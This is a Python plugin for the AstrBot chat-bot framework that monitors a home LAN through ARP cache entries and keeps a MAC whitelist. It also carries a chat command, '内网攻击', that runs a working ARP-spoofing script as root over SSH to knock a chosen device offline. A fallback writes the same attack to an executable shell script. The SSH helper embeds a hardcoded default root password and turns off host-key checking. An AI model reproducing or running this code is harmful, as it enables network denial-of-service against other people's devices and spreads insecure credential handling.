import asyncio
import json
import os
import re
import subprocess
from datetime import datetime

from astrbot.api.event import AstrMessageEvent, filter
from astrbot.api.star import Context, Star, register
from astrbot.api import logger

_PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
_DEVICES_FILE = os.path.join(_PLUGIN_DIR, "known_devices.json")
_ARP_FILE = "/AstrBot/data/arp_cache.txt"


def _parse_ip_neigh(content: str) -> list:
    """解析 ip neigh 命令输出"""
    devices = []
    seen = set()
    for line in content.splitlines():
        line = line.strip()
        if not line or "lladdr" not in line:
            continue
        parts = line.split()
        ip = parts[0]
        if ip.count(".") != 3:
            continue
        lladdr_idx = parts.index("lladdr")
        if lladdr_idx + 1 < len(parts):
            mac = parts[lladdr_idx + 1].lower()
            if mac.count(":") == 5 and mac not in seen:
                seen.add(mac)
                devices.append({"ip": ip, "mac": mac})
    return devices


def _read_arp() -> list:
    """从共享文件读取 ARP 缓存"""
    if not os.path.exists(_ARP_FILE):
        return []
    try:
        with open(_ARP_FILE, "r") as f:
            return _parse_ip_neigh(f.read())
    except Exception as e:
        logger.error(f"[NetworkGuard] 读ARP文件失败: {e}")
        return []


def _load_devices() -> list:
    """加载已保存的设备列表"""
    if os.path.exists(_DEVICES_FILE):
        try:
            with open(_DEVICES_FILE, "r") as f:
                return json.load(f)
        except Exception:
            return []
    return []


def _save_devices(devices: list):
    """保存设备列表"""
    try:
        with open(_DEVICES_FILE, "w") as f:
            json.dump(devices, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"[NetworkGuard] 保存设备失败: {e}")


def _load_cfg() -> dict:
    """加载本地配置"""
    p = os.path.join(_PLUGIN_DIR, "config.json")
    if os.path.exists(p):
        try:
            with open(p) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def _save_cfg(cfg: dict):
    """保存本地配置"""
    p = os.path.join(_PLUGIN_DIR, "config.json")
    try:
        existing = _load_cfg()
        existing.update(cfg)
        with open(p, "w") as f:
            json.dump(existing, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"[NetworkGuard] 配置保存失败: {e}")


def _get_cfg(key: str, default=None):
    """获取配置"""
    return _load_cfg().get(key, default)


def _get_whitelist() -> set:
    """获取白名单 MAC 地址集合"""
    macs = set()
    for entry in _get_cfg("known_devices", []):
        if ":" in str(entry):
            mac = entry.split(":")[0].strip().lower()
            if mac.count(":") == 5:
                macs.add(mac)
    return macs


def _ssh_cmd(cmd: str, timeout: int = 15) -> str:
    """通过 sshpass + ssh 在宿主机上执行命令"""
    try:
        r = subprocess.run(
            ["sshpass", "-p", _get_cfg("ssh_password", "tommy12345"),
             "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
             f"root@{_get_cfg('ssh_host', '192.168.31.42')}", cmd],
            capture_output=True, timeout=timeout
        )
        return r.stdout.decode("utf-8", errors="ignore")
    except Exception as e:
        logger.warning(f"[NetworkGuard] SSH失败: {e}")
        return ""


@register("network_guard", "AstrBot", "内网设备监控守卫", "1.0.3")
class NetworkGuardPlugin(Star):
    def __init__(self, context: Context, config: dict = None):
        super().__init__(context)
        self.scan_task = None

    async def initialize(self):
        logger.info("[NetworkGuard] 内网监控守卫已加载")
        self.scan_task = asyncio.create_task(self._auto_scan())

    async def terminate(self):
        if self.scan_task and not self.scan_task.done():
            self.scan_task.cancel()

    async def _auto_scan(self):
        """自动扫描循环"""
        await asyncio.sleep(10)
        while True:
            try:
                interval = int(_get_cfg("scan_interval", 10))
                await self._check_new()
                await asyncio.sleep(interval * 60)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[NetworkGuard] 自动扫描异常: {e}")
                await asyncio.sleep(60)

    async def _check_new(self):
        """对比检查新设备"""
        current = _read_arp()
        old = _load_devices()
        old_macs = {d["mac"] for d in old}
        whitelist = _get_whitelist()

        new_ones = [d for d in current if d["mac"] not in old_macs]
        unknown = [d for d in current if d["mac"] not in whitelist and d["ip"] != "192.168.31.1"]

        msgs = []
        for d in new_ones:
            msgs.append(f"🆕 新设备: {d['ip']} ({d['mac']})")
        for d in unknown:
            if d not in new_ones:
                msgs.append(f"⚠️ 陌生设备: {d['ip']} ({d['mac']})")

        if msgs and _get_cfg("notify_on_new", True):
            try:
                asyncio.create_task(
                    self.context.send_message(
                        "93E7D4D47A13E3621185AB98B8B3420B",
                        "\n".join(msgs)
                    )
                )
            except Exception as e:
                logger.error(f"[NetworkGuard] 通知失败: {e}")

    # ========== 指令处理 ==========

    @filter.command("内网扫描")
    async def handle_scan(self, event: AstrMessageEvent):
        """扫描局域网"""
        devices = _read_arp()
        if not devices:
            yield event.plain_result("❌ 未发现设备，等待 cron 更新...")
            return
        _save_devices(devices)
        lines = [f"📡 内网设备 ({len(devices)} 台)"]
        for d in devices[:25]:
            lines.append(f"  {d['ip']}  {d['mac']}")
        yield event.plain_result("\n".join(lines))

    @filter.command("内网列表")
    async def handle_list(self, event: AstrMessageEvent):
        """查看已记录设备"""
        devices = _load_devices()
        if not devices:
            yield event.plain_result("📭 暂无记录，请先执行 内网扫描")
            return
        wl = _get_whitelist()
        lines = [f"📋 已记录 ({len(devices)} 台)"]
        for d in devices:
            tag = " ✅" if d["mac"] in wl else ""
            lines.append(f"{tag} {d['ip']}  {d['mac']}")
        yield event.plain_result("\n".join(lines[:30]))

    @filter.command("内网信任")
    async def handle_trust(self, event: AstrMessageEvent):
        """添加白名单: 内网信任 <MAC> <名称>"""
        parts = (event.message_str or "").strip().split(maxsplit=2)
        if len(parts) < 2:
            yield event.plain_result("用法: 内网信任 <MAC地址> <名称>")
            return
        mac = parts[1].strip().lower()
        name = parts[2].strip() if len(parts) > 2 else "未知"
        if mac.count(":") != 5:
            yield event.plain_result("❌ MAC 格式错误，请使用 aa:bb:cc:dd:ee:ff 格式")
            return
        known = _get_cfg("known_devices", [])
        known = [k for k in known if not k.startswith(mac)]
        known.append(f"{mac}:{name}")
        _save_cfg({"known_devices": known})
        yield event.plain_result(f"✅ 已信任 {mac} ({name})")

    @filter.command("内网移除")
    async def handle_untrust(self, event: AstrMessageEvent):
        """移除白名单: 内网移除 <MAC>"""
        parts = (event.message_str or "").strip().split()
        if len(parts) < 2:
            yield event.plain_result("用法: 内网移除 <MAC地址>")
            return
        mac = parts[1].strip().lower()
        known = _get_cfg("known_devices", [])
        new_k = [k for k in known if not k.startswith(mac)]
        if len(new_k) == len(known):
            yield event.plain_result(f"ℹ️ 未找到 {mac}")
            return
        _save_cfg({"known_devices": new_k})
        yield event.plain_result(f"✅ 已移除 {mac}")

    @filter.command("内网攻击")
    async def handle_attack(self, event: AstrMessageEvent):
        """ARP 攻击踢下线: 内网攻击 <IP> [秒数]"""
        parts = (event.message_str or "").strip().split()
        if len(parts) < 2:
            yield event.plain_result("用法: 内网攻击 <IP地址> [持续时间秒]")
            return
        ip = parts[1]
        dur = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 60
        gw = _get_cfg("subnet", "192.168.31.0/24").rsplit(".", 1)[0] + ".1"

        yield event.plain_result(f"⚔️ 正在攻击 {ip}，持续 {dur} 秒...")
        asyncio.create_task(self._do_attack(ip, gw, dur))
        yield event.plain_result(f"✅ 攻击任务已启动，{dur} 秒后自动恢复")

    async def _do_attack(self, target_ip: str, gw_ip: str, duration: int):
        """执行 ARP 攻击"""
        script = f'''python3 -c "
import socket, struct, time
def mb(m): return bytes.fromhex(m.replace(':',''))
def ib(ip): return bytes(int(x) for x in ip.split('.'))
try:
    with open('/sys/class/net/eno1/address') as f: mymac = f.read().strip()
except: mymac = '00:00:00:00:00:00'
sm = mb(mymac); fm = mb('00:00:00:00:00:01'); gw = '{gw_ip}'; ti = '{target_ip}'
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
sock.bind(('eno1', 0))
end = time.time() + {duration}; cnt = 0
while time.time() < end:
    for vic,tmac in [(ti,fm),(gw,fm)]:
        eth = b'\\\\xff'*6 + sm + struct.pack('!H',0x0806)
        arp = struct.pack('!HHBBH',1,0x0800,6,4,2) + sm + ib(gw) + fm + ib(ti)
        sock.send(eth+arp); cnt += 1
    time.sleep(1)
sock.close()
print(f'Done: {{cnt}} packets')
"'''
        out = _ssh_cmd(script, duration + 15)
        if out:
            logger.info(f"[NetworkGuard] ARP 攻击: {out.strip()[:100]}")
        else:
            # SSH 失败，写命令文件到共享目录供主机执行
            logger.warning("[NetworkGuard] SSH失败，尝试备用方案")
            await self._fallback_attack(target_ip, gw_ip, duration)

    async def _fallback_attack(self, target_ip: str, gw_ip: str, duration: int):
        """备用方案：写攻击脚本到共享目录"""
        script_content = f"""#!/bin/bash
python3 -c "
import socket, struct, time
def mb(m): return bytes.fromhex(m.replace(':',''))
def ib(ip): return bytes(int(x) for x in ip.split('.'))
sm = mb(open('/sys/class/net/eno1/address').read().strip())
fm = mb('00:00:00:00:00:01')
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
sock.bind(('eno1', 0))
end = time.time() + {duration}; cnt = 0
while time.time() < end:
    eth = b'\\\\xff'*6 + sm + struct.pack('!H',0x0806)
    arp = struct.pack('!HHBBH',1,0x0800,6,4,2) + sm + ib('{gw_ip}') + fm + ib('{target_ip}')
    sock.send(eth+arp); cnt += 1; time.sleep(1)
sock.close()
print(f'Done: {{cnt}}')
"
"""
        try:
            script_file = "/vol1/@appdata/astrbot/data/arp_attack.sh" if os.path.exists("/vol1/@appdata/astrbot/data/") else "/AstrBot/data/arp_attack.sh"
            with open("/AstrBot/data/arp_attack.sh", "w") as f:
                f.write(script_content)
            os.chmod("/AstrBot/data/arp_attack.sh", 0o755)
            logger.info(f"[NetworkGuard] 攻击脚本已写入: {script_file}")
        except Exception as e:
            logger.error(f"[NetworkGuard] 备用方案失败: {e}")

    @filter.command("内网停止")
    async def handle_stop(self, event: AstrMessageEvent):
        """恢复设备网络"""
        parts = (event.message_str or "").strip().split()
        if len(parts) < 2:
            yield event.plain_result("用法: 内网停止 <IP地址>")
            return
        ip = parts[1]
        _ssh_cmd(f"arp -d {ip} 2>/dev/null; ip neigh flush dev eno1 to {ip} 2>/dev/null")
        yield event.plain_result(f"✅ 已尝试恢复 {ip}")

    @filter.command("内网帮助")
    async def handle_help(self, event: AstrMessageEvent):
        yield event.plain_result(
            "📡 内网监控守卫\n\n"
            "内网扫描 — 列出当前设备\n"
            "内网列表 — 查看已记录\n"
            "内网信任 <MAC> <名称> — 白名单\n"
            "内网移除 <MAC> — 移出白名单\n"
            "内网攻击 <IP> [秒数] — ARP踢下线\n"
            "内网停止 <IP> — 恢复网络\n"
            "内网帮助 — 本帮助\n\n"
            "💡 发送指令不需加 / 前缀"
        )
